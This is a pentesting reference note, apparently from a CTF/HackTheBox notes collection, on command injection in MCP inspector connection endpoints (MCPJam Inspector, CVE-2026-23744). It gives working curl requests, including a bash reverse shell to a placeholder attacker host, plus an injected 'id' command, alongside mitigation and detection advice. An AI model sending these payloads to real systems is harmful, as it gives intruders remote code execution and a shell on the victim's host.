---
topic: MCP Inspector — command injection when connecting servers
tags: [web, mcp, command-injection, rce, devhub]
---

# MCP Inspector — command injection when connecting servers

[🇪🇸 Español](mcp-server-command-injection.md) | **English**

## Concept

MCP (Model Context Protocol) inspectors configure local `stdio` servers. They receive a command and arguments and run them through `child_process.spawn`. If the API accepting that configuration does not validate or separate arguments, an attacker can submit an arbitrary command and execute code on the inspector host.

MCPJam Inspector 1.4.2 is vulnerable (CVE-2026-23744): `POST /api/mcp/connect` takes the server command and passes it to `spawn` without sanitising.

## When it applies

- Inspector or MCP dashboard exposed to the network, not just `127.0.0.1`.
- A connection endpoint accepting `command`, `args`, `transport` or a server URL.
- The process runs as a user with access to secrets or the rest of the host.
- No authentication, or default panel credentials.

## Procedure

1. Locate the inspector (`3000`, `6274`, `8080`, `/api/mcp`).
2. Identify the connection endpoint and its JSON schema.
3. Send a test command (`id`, `whoami`) and watch the response or callback.
4. Switch to a reverse shell or file read.
5. On DevHub, the inspector allowed connecting an MCP server and running commands; the chain continued with Jupyter and OPSMCP.

## Commands

```bash
curl -s -X POST http://<HOST>:6274/api/mcp/connect \
  -H 'Content-Type: application/json' \
  -d '{"transport":"stdio","command":"id","args":[]}'
```

```bash
curl -s -X POST http://<HOST>:6274/api/mcp/connect \
  -H 'Content-Type: application/json' \
  -d '{"transport":"stdio","command":"bash","args":["-c","bash -i >& /dev/tcp/<ATTACKER>/443 0>&1"]}'
```

If the field is concatenated into a string:

```json
{"command":"node server.js; id"}
```

## Variants

- Inject through `args` when the binary is fixed but arguments are not escaped.
- Use `npx`, `uvx` or `python -c` as allowed executables.
- Connect to an attacker-controlled MCP server to steal tokens or return malicious tools.
- Chain execution with reading the inspector's environment variables.

## Limitations

- Many inspectors only listen on loopback; you need SSRF, a tunnel or local access.
- `spawn` with an argument array is not injectable; look for concatenation or `shell: true`.
- Containers without a shell or network restrict the payload.
- The endpoint may require a session or CSRF token.

## Mitigation

- Do not expose development inspectors outside loopback.
- Use an executable and argument allowlist, without `shell: true`.
- Authenticate and authorise the endpoint; require same-origin and CSRF protection.
- Run the inspector in a container without secrets or host mounts.
- Update MCPJam Inspector to a fixed version.

## Detection

- Requests to `/api/mcp/connect` with a `command` outside the allowlist.
- Child processes of the inspector running `bash`, `sh`, `powershell` or `curl`.
- Outbound connections from the inspector port.
- Changes to the MCP server configuration.

## References

- [NVD — CVE-2026-23744](https://nvd.nist.gov/vuln/detail/CVE-2026-23744)
- [MCP — Security best practices](https://modelcontextprotocol.io/specification/2025-06-18/basic/security_best_practices)
- [0xdf — DevHub](https://0xdf.gitlab.io/2026/01/24/htb-devhub.html)
- [DevHub writeup](../../machines/linux/devhub/README.en.md)
